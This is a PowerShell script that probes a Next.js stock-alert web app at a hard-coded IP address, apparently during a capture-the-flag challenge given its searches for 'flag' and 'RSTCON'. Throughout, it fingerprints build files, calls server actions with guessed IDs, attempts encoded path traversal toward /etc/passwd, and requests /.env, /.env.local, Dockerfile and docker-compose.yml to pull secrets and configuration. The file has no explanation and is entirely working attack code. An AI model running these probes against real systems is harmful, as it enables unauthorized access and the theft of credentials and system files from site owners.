$base = "http://18.215.143.250:3000"
$buildId = "qyfJNY9j0_iFz3SifWy5m"

# Try build manifest files
Write-Output "=== Build Manifest ==="
try { $r = Invoke-WebRequest -Uri "$base/_next/static/$buildId/_buildManifest.js" -TimeoutSec 10 -UseBasicParsing; Write-Output $r.Content } catch { Write-Output $_.Exception.Message }

Write-Output "`n=== SSG Manifest ==="
try { $r2 = Invoke-WebRequest -Uri "$base/_next/static/$buildId/_ssgManifest.js" -TimeoutSec 10 -UseBasicParsing; Write-Output $r2.Content } catch { Write-Output $_.Exception.Message }

# Check Last-Modified header on main page
Write-Output "`n=== Full response headers for / ==="
try {
    $r3 = Invoke-WebRequest -Uri "$base/" -TimeoutSec 10 -UseBasicParsing
    $r3.Headers | Format-List
} catch { Write-Output $_.Exception.Message }

# Check headers for static assets
Write-Output "`n=== Headers for webpack JS ==="
try {
    $r4 = Invoke-WebRequest -Uri "$base/_next/static/chunks/webpack-06b7f1618a9e9933.js" -TimeoutSec 10 -UseBasicParsing
    $r4.Headers | Format-List
} catch { Write-Output $_.Exception.Message }

# Check headers for CSS
Write-Output "`n=== Headers for CSS ==="
try {
    $r5 = Invoke-WebRequest -Uri "$base/_next/static/css/ca8fec6386f00dd3.css" -TimeoutSec 10 -UseBasicParsing
    $r5.Headers | Format-List
    Write-Output "`n=== CSS Content ==="
    Write-Output $r5.Content
} catch { Write-Output $_.Exception.Message }

# Get full stock detail page
Write-Output "`n=== Full stock detail page ==="
try {
    $r6 = Invoke-WebRequest -Uri "$base/stock/AAPL" -TimeoutSec 10 -UseBasicParsing
    # Search for interesting patterns
    $content = $r6.Content
    $matches = [regex]::Matches($content, '(?:flag|rstcon|RSTCON|FLAG|secret|hidden|date|created|built|modified|git|commit|deploy)(?i)[^<]{0,300}')
    foreach ($m in $matches) { Write-Output "MATCH: $($m.Value)" }
    
    # Extract RSC payload (script contents)
    $scriptMatches = [regex]::Matches($content, 'self\.__next_f\.push\(\[1,"(.*?)"\]\)')
    foreach ($m in $scriptMatches) { Write-Output "RSC: $($m.Groups[1].Value.Substring(0, [Math]::Min(500, $m.Groups[1].Value.Length)))" }
} catch { Write-Output $_.Exception.Message }

# Try stock tickers from description
Write-Output "`n=== /stock/SHOP ==="
try { $r7 = Invoke-WebRequest -Uri "$base/stock/SHOP" -TimeoutSec 10 -UseBasicParsing; Write-Output $r7.Content.Substring(0, [Math]::Min(500, $r7.Content.Length)) } catch { Write-Output $_.Exception.Message }

Write-Output "`n=== /stock/PAY ==="
try { $r8 = Invoke-WebRequest -Uri "$base/stock/PAY" -TimeoutSec 10 -UseBasicParsing; Write-Output $r8.Content.Substring(0, [Math]::Min(500, $r8.Content.Length)) } catch { Write-Output $_.Exception.Message }

Write-Output "`n=== /stock/DASH ==="
try { $r9 = Invoke-WebRequest -Uri "$base/stock/DASH" -TimeoutSec 10 -UseBasicParsing; Write-Output $r9.Content.Substring(0, [Math]::Min(500, $r9.Content.Length)) } catch { Write-Output $_.Exception.Message }

Write-Output "`n=== /stock/BOX ==="
try { $r10 = Invoke-WebRequest -Uri "$base/stock/BOX" -TimeoutSec 10 -UseBasicParsing; Write-Output $r10.Content.Substring(0, [Math]::Min(500, $r10.Content.Length)) } catch { Write-Output $_.Exception.Message }

# Try to call setPriceAlert server action
Write-Output "`n=== setPriceAlert server action ==="
try {
    $headers = @{
        "Content-Type" = "text/plain;charset=UTF-8"
        "Next-Action" = "4052fdcd2e0b2bd97d604c084f5d0c698a3baad18a"
    }
    $body = '[{"symbol":"AAPL","targetPrice":200,"direction":"above","email":"test@test.com"}]'
    $r11 = Invoke-WebRequest -Uri "$base/stock/AAPL" -Method POST -Headers $headers -Body $body -TimeoutSec 10 -UseBasicParsing
    Write-Output $r11.Content
} catch { Write-Output $_.Exception.Message }

# Try path traversal on stock route
Write-Output "`n=== /stock/../../../etc/passwd ==="
try { $r12 = Invoke-WebRequest -Uri "$base/stock/..%2F..%2F..%2Fetc%2Fpasswd" -TimeoutSec 10 -UseBasicParsing; Write-Output $r12.Content.Substring(0, [Math]::Min(500, $r12.Content.Length)) } catch { Write-Output $_.Exception.Message }

Write-Output "`n=== /stock/..%252f..%252f..%252fetc%252fpasswd ==="
try { $r13 = Invoke-WebRequest -Uri "$base/stock/..%252f..%252f..%252fetc%252fpasswd" -TimeoutSec 10 -UseBasicParsing; Write-Output $r13.Content.Substring(0, [Math]::Min(500, $r13.Content.Length)) } catch { Write-Output $_.Exception.Message }

# Check for cookies
Write-Output "`n=== Cookie check ==="
try {
    $session = [Microsoft.PowerShell.Commands.WebRequestSession]::new()
    $r14 = Invoke-WebRequest -Uri "$base/" -TimeoutSec 10 -UseBasicParsing -WebSession $session
    Write-Output "Cookies:"
    foreach ($cookie in $session.Cookies.GetCookies("$base/")) {
        Write-Output "  $($cookie.Name) = $($cookie.Value)"
    }
} catch { Write-Output $_.Exception.Message }

# Try the server action for searching with various terms
Write-Output "`n=== Search 'date' ==="
try {
    $headers = @{
        "Content-Type" = "text/plain;charset=UTF-8"
        "Next-Action" = "40881a01be516941afc21e3145707ceff4a34545af"
    }
    $body = '["date"]'
    $r15 = Invoke-WebRequest -Uri "$base" -Method POST -Headers $headers -Body $body -TimeoutSec 10 -UseBasicParsing
    Write-Output $r15.Content
} catch { Write-Output $_.Exception.Message }

Write-Output "`n=== Search 'flag' ==="
try {
    $headers = @{
        "Content-Type" = "text/plain;charset=UTF-8"
        "Next-Action" = "40881a01be516941afc21e3145707ceff4a34545af"
    }
    $body = '["flag"]'
    $r16 = Invoke-WebRequest -Uri "$base" -Method POST -Headers $headers -Body $body -TimeoutSec 10 -UseBasicParsing
    Write-Output $r16.Content
} catch { Write-Output $_.Exception.Message }

Write-Output "`n=== Search 'RSTCON' ==="
try {
    $headers = @{
        "Content-Type" = "text/plain;charset=UTF-8"
        "Next-Action" = "40881a01be516941afc21e3145707ceff4a34545af"
    }
    $body = '["RSTCON"]'
    $r17 = Invoke-WebRequest -Uri "$base" -Method POST -Headers $headers -Body $body -TimeoutSec 10 -UseBasicParsing
    Write-Output $r17.Content
} catch { Write-Output $_.Exception.Message }

# Check the /_next/static route for directory listing
Write-Output "`n=== /_next/static/ ==="
try { $r18 = Invoke-WebRequest -Uri "$base/_next/static/" -TimeoutSec 10 -UseBasicParsing; Write-Output $r18.Content.Substring(0, [Math]::Min(2000, $r18.Content.Length)) } catch { Write-Output $_.Exception.Message }

# Check for env file
Write-Output "`n=== /.env ==="
try { $r19 = Invoke-WebRequest -Uri "$base/.env" -TimeoutSec 8 -UseBasicParsing; Write-Output $r19.Content } catch { Write-Output $_.Exception.Message }

Write-Output "`n=== /.env.local ==="
try { $r20 = Invoke-WebRequest -Uri "$base/.env.local" -TimeoutSec 8 -UseBasicParsing; Write-Output $r20.Content } catch { Write-Output $_.Exception.Message }

# Check for Dockerfile or docker-compose
Write-Output "`n=== /Dockerfile ==="
try { $r21 = Invoke-WebRequest -Uri "$base/Dockerfile" -TimeoutSec 8 -UseBasicParsing; Write-Output $r21.Content } catch { Write-Output $_.Exception.Message }

Write-Output "`n=== /docker-compose.yml ==="
try { $r22 = Invoke-WebRequest -Uri "$base/docker-compose.yml" -TimeoutSec 8 -UseBasicParsing; Write-Output $r22.Content } catch { Write-Output $_.Exception.Message }
